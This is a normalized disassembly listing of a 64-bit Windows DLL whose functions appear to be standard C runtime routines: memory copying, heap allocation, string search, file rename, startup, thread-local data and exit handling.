jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_1800034f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_180003c18
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_1800035c8
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_180003b6c
call sub_180003afc
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_180003afc
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180003ab4
mov [ rbx ] eax
mov rcx rbx
call sub_180003b6c
test eax eax
je r-xdata
call sub_180003afc
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180003ab4
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_1800035c8
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_180003afc
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180003ab4
mov [ rbx ] eax
sub_180003608
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_180003630
cmp [ rdx ] 0x0
mov r9 rdx
mov r8 rcx
jne r-xdata
mov al [ rcx ]
test al al
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r11 rdx
neg r11
cmp [ rdx ] 0x0
je r-xdata
lea r10 [ r11 + r8 ]
mov rax r8
retn
inc r8
mov al [ r8 ]
test al al
jne r-xdata
movsx ecx [ r10 + rdx ]
movsx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r9
test al al
je r-xdata
inc rdx
cmp [ r10 + rdx ] 0x0
jne r-xdata
cmp [ rdx ] 0x0
je r-xdata
sub_180003688
sub rsp 0x28
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
mov ecx eax
call sub_180003b1c
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
add rsp 0x28
retn
sub_1800036b8
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_180003ba0
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_1800041dc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_180003edc
mov edx 0x2c8
mov ecx 0x1
call sub_1800042e0
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_180004fc4
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_180004ed0
mov [ rw-data ] rax
call sub_180004790
test eax eax
jns r-xdata
call sub_180003bf8
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_18000419c
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_180004758
call sub_180004dd8
test eax eax
js r-xdata
call sub_180003ee0
jmp r-xdata
call sub_1800035c8
jmp r-xdata
xor edx edx
call sub_180003f08
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_180004a64
call sub_180003ee0
call sub_180003bf8
nop
call sub_180004a64
jmp r-xdata
call sub_180004ad8
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_18000450c
test eax eax
jne r-xdata
call sub_180003ee0
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_18000380c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180001d80
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_1800036b8
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_1800036b8
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180001d80
mov r8 rsi
xor edx edx
mov rcx r12
call sub_1800036b8
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000380c
call sub_180005218
sub_180003968
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_1800052cc
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_1800052cc
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_180003ab4
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_180003b1c
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180003fc0
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_180003ab4
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_180003fc0
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_180003b6c
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180003ba0
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_180003c18
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_180003b6c
call sub_180003afc
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_1800059c8
mov ecx 0x1e
call sub_180005768
mov ecx 0xff
call sub_180004428
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_180003afc
mov [ rax ] 0xc
mov rcx rbx
call sub_180003b6c
test eax eax
je r-xdata
call sub_180003afc
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_180003cd0
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_180005a50
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_180005a80
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ rw-data ]
call sub_180005b10
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ rw-data ]
sub_180003f08
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_1800056f8
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_1800055f8
mov ecx 0xc
call sub_1800056f8
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_180005b54
nop
mov ecx 0xc
call sub_1800055f8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_180003fc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_1800042e0
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_1800035c8
xor ebx ebx
xor edx edx
call sub_180003f08
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_180004068
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_1800035c8
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_1800035c8
mov edi 0xd
mov ecx edi
call sub_1800056f8
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_1800035c8
mov ecx edi
call sub_1800055f8
mov ecx 0xc
call sub_1800056f8
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_1800055f8
mov rcx rbx
call sub_1800035c8
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_180005be0
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_1800035c8
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_180005c84
nop
sub_18000419c
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_180004068
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_1800041dc
push rbx
sub rsp 0x20
call sub_180004458
call sub_1800054ec
test eax eax
je r-xdata
call sub_180003ee0
xor eax eax
lea rcx [ sub_180004068 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_1800042e0
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_180003f08
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180004260
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_180003c18
mov rbx rax
test rax rax
jne r-xdata
sub_1800042e0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_1800067bc
mov rbx rax
test rax rax
jne r-xdata
sub_180004364
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_1800034f4
mov rbx rax
test rax rax
jne r-xdata
sub_1800043ec
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_180004458
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_180003b64
mov rcx rbx
call sub_1800052d4
mov rcx rbx
call sub_180006b08
mov rcx rbx
call sub_180006b00
mov rcx rbx
call sub_18000689c
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_18000687c
sub_18000449c
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_1800044d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_18000450c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_180006c78
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_1800044d0
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call sub_180005b10
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_180004ffc ]
call sub_180006c60
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ rw-data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_180005b10
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_1800045bc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_1800056f8
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_1800055f8
mov ecx r15d
call sub_1800043ec
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_1800055f8
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000449c
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000449c
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
